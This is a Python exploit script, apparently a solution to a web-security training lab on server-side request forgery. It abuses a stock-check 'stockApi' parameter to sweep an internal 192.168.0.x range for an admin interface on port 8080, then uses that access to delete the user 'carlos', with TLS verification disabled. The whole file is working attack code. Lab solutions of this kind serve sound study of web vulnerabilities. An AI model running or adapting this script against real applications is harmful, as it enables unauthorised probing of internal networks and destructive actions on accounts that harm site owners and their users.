# Lab: Basic SSRF against another back-end system
# This script changes the stock check URL to access the admin interface and deletes a user
import sys
import urllib3
import requests
import os
from dotenv import load_dotenv


load_dotenv()


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def delete_user(stock_path, admin_ipaddr):
    delete_path = "/delete?username=carlos"
    data = {"stockApi": f"http://{admin_ipaddr}:8080/admin{delete_path}"}
    r = requests.post(stock_path, data=data, verify=False, proxies=proxies)

    check_admin_url = "http://%s:8080/admin" % admin_ipaddr
    data2 = {"stockApi": check_admin_url}

    r = requests.post(stock_path, data=data2, verify=False, proxies=proxies)

    if "User deleted successfully" in r.text:
        print("(-> Successfully deleted user")
    else:
        print("(-) Couldn't delete user")
        exit(-1)


def check_admin_hostname(stock_url):
    print("(-> Finding IP...")
    for i in range(1, 256):
        hostname = f"http://192.168.0.{i}:8080/admin"
        data = {"stockApi": hostname}
        r = requests.post(stock_url, data=data, verify=False, proxies=proxies)

        if r.status_code == 200:
            admin_ipaddr = f"192.168.0.{i}"
            return admin_ipaddr

    print("(-) Couldn't find admin hostname")
    return -1


def ssrf_to_delete_user(url):
    stock_path = url + "/product/stock"
    # First find admin IP address
    admin_ipaddr = check_admin_hostname(stock_path)
    delete_user(stock_path, admin_ipaddr)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> SSRF against another back-end server example...")
    ssrf_to_delete_user(url)


if __name__ == "__main__":
    main()
